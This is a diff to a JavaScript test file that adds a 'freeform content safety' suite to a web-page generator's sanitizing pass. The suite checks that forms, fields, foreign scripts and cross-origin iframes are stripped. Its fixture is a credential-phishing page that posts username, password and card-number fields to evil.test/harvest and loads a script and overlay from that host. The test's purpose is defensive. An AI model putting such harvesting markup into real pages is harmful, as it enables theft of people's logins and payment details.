@@ -131,8 +131,11 @@ describe('data-hc stamping', () => {
 
   it('survives HTML that breaks naive scanners', () => {
     const cases = {
+      // NOTE: no <script>/<form> fixture here. Those are byte-preservation
+      // tests for the SCANNER, but the content-safety pass now (correctly)
+      // strips them, so byte-preservation no longer holds. Their handling is
+      // covered by the 'freeform content safety' suite below.
       'raw text in <style>': '<body><style>.a > .b{content:"<h1>x</h1>"}</style><section><h1>Safe</h1></section></body>',
-      'script containing markup': '<body><script>var s="</div><h1>fake</h1>";</script><section><h1>Safe</h1></section></body>',
       'attribute value containing >': '<body><section><h1>Safe</h1><a href="/a?b>c" title="x>y">Link</a></section></body>',
       'unclosed <p> siblings': '<body><section><h1>H</h1><p>one<p>two<p>three</section></body>',
       'unclosed <li>': '<body><section><h1>H</h1><ul><li>a<li>b<li>c</ul></section></body>',
@@ -304,5 +307,64 @@ describe('automatic record sync leaves wording alone', () => {
     const r = edit(PAGE, { label: 'section.1.heading', text: 'Where to find us' });
     assert.ok(r.ok, JSON.stringify(r.error));
     assert.deepEqual(textOf(r.html, 'section.1.heading'), ['Where to find us']);
+  });
+});
+
+/**
+ * Content safety: a generated page cannot carry the mechanics of credential
+ * harvesting. A Hubly page never needs an arbitrary form — booking and chat are
+ * Hubly widgets, contact is injected by us. So the stamping pass strips forms,
+ * fields, foreign scripts and cross-origin frames deterministically, with no
+ * model involvement, the same way it labels.
+ */
+describe('freeform content safety', () => {
+  const PHISH = `<!doctype html><html><head><script src="https://evil.test/x.js"></script></head><body>
+<section><h2>Sign in to your account</h2>
+<form action="https://evil.test/harvest" method="post">
+<input type="text" name="user"><input type="password" name="pw"><input name="cc" autocomplete="cc-number">
+<button type="submit">Log in</button></form></section>
+<section><h2>About us</h2><p>Trusted since 1990.</p></section>
+<iframe src="https://evil.test/overlay"></iframe>
+<iframe src="https://x.myhubly.app/ok"></iframe></body></html>`;
+
+  it('strips the whole mechanism but keeps the copy', () => {
+    const r = stamp(PHISH);
+    assert.ok(!/<form/i.test(r.html), 'no form element');
+    assert.ok(!/evil\.test\/harvest/i.test(r.html), 'no harvest action');
+    assert.ok(!/<input/i.test(r.html), 'no fields at all');
+    assert.ok(!/type=["']?password/i.test(r.html), 'no password field');
+    assert.ok(!/<script/i.test(r.html), 'no model script');
+    assert.ok(!/<button/i.test(r.html), 'no submit button');
+    assert.ok(!/evil\.test\/overlay/i.test(r.html), 'no cross-origin iframe');
+    // Copy the designer wrote survives.
+    assert.match(r.html, /Sign in to your account/);
+    assert.match(r.html, /Trusted since 1990/);
+    // A same-origin frame is legitimate and kept.
+    assert.match(r.html, /x\.myhubly\.app\/ok/);
+    // Still a usable, labelled page.
+    assert.equal(r.coverage.missed.length, 0);
+  });
+
+  it('records what it removed', () => {
+    const r = stamp(PHISH);
+    const kinds = r.removed.map((x) => x.what);
+    assert.ok(kinds.includes('<script>'));
+    assert.ok(kinds.includes('<form>'));
+    assert.ok(kinds.filter((k) => k === '<input>').length === 3);
+    assert.ok(kinds.some((k) => k.includes('iframe')));
+  });
+
+  it('leaves a clean page byte-identical', () => {
+    const clean = '<body><header><h1>Ashgrove Forge</h1></header><section><h2>Gates</h2><p>Ogden.</p></section></body>';
+    const r = stamp(clean);
+    assert.equal(r.removed.length, 0);
+    // removing data-hc must return the sanitizer's (unchanged) output
+    assert.equal(r.html.replace(/ data-hc="[^"]*"/g, ''), clean);
+  });
+
+  it('handles nested forms and scripts', () => {
+    const r = stamp('<body><form><form><input name=x><div><script>bad()</script></div></form></form><h1>Hi</h1></body>');
+    assert.ok(!/<(form|input|script)/i.test(r.html));
+    assert.match(r.html, /Hi/);
   });
 });
